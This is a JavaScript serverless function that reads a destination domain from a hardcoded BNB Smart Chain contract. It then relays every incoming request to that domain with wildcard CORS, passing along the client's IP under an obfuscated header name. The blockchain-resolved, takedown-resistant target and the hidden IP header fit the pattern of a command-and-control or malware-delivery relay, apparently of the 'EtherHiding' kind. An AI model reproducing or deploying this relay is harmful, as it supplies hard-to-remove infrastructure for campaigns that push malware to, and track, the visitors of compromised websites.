const https = require('https');
const http = require('http');

// CORS headers
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
  'Access-Control-Allow-Headers': '*',
  'Access-Control-Max-Age': '86400'
};

function getClientIP(event) {
  // Check for Cloudflare IP
  if (event.headers['cf-connecting-ip']) {
    return event.headers['cf-connecting-ip'];
  }
  
  // Check X-Forwarded-For
  if (event.headers['x-forwarded-for']) {
    const ips = event.headers['x-forwarded-for'].split(',');
    return ips[0].trim();
  }
  
  // Fallback to direct IP
  return event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown';
}

function hexToString(hex) {
  hex = hex.replace(/^0x/, '');
  hex = hex.substring(64);
  const lengthHex = hex.substring(0, 64);
  const length = parseInt(lengthHex, 16);
  const dataHex = hex.substring(64, 64 + length * 2);
  let result = '';
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.substr(i, 2), 16);
    if (charCode === 0) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

async function fetchTargetDomain() {
  const rpcUrls = [
    "https://binance.llamarpc.com",
    "https://bsc.drpc.org"
  ];
  const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
  const data = '20965255';
  
  for (const rpcUrl of rpcUrls) {
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_call',
          params: [{
            to: contractAddress,
            data: '0x' + data
          }, 'latest']
        })
      });
      
      const responseData = await response.json();
      if (responseData.error) continue;
      
      const domain = hexToString(responseData.result);
      if (domain) return domain;
    } catch (error) {
      console.error('RPC Error:', error);
      continue;
    }
  }
  throw new Error('Could not fetch target domain');
}

async function proxyRequest(targetUrl, event) {
  const clientIP = getClientIP(event);
  
  // Prepare headers
  const headers = { ...event.headers };
  delete headers.host;
  delete headers.origin;
  delete headers['accept-encoding'];
  delete headers['content-encoding'];
  headers['x-dfkjldifjlifjd'] = clientIP;
  
  const options = {
    method: event.httpMethod,
    headers: headers
  };
  
  if (event.body && event.httpMethod !== 'GET' && event.httpMethod !== 'HEAD') {
    options.body = event.body;
  }
  
  try {
    const response = await fetch(targetUrl, options);
    const responseText = await response.text();
    
    return {
      statusCode: response.status,
      headers: {
        ...corsHeaders,
        'Content-Type': response.headers.get('content-type') || 'text/plain'
      },
      body: responseText
    };
  } catch (error) {
    console.error('Proxy Error:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: 'Proxy error: ' + error.message
    };
  }
}

exports.handler = async (event, context) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: corsHeaders
    };
  }
  
  const endpoint = event.queryStringParameters?.e;
  
  if (endpoint === 'ping_proxy') {
    return {
      statusCode: 200,
      headers: {
        ...corsHeaders,
        'Content-Type': 'text/plain'
      },
      body: 'pong'
    };
  }
  
  if (!endpoint) {
    return {
      statusCode: 400,
      headers: corsHeaders,
      body: 'Missing endpoint'
    };
  }
  
  try {
    const targetDomain = await fetchTargetDomain();
    const targetUrl = targetDomain.replace(/\/$/, '') + '/' + endpoint.replace(/^\//, '');
    
    return await proxyRequest(targetUrl, event);
  } catch (error) {
    console.error('Handler Error:', error);
    return {
      statusCode: 500,
      headers: corsHeaders,
      body: 'Error: ' + error.message
    };
  }
};
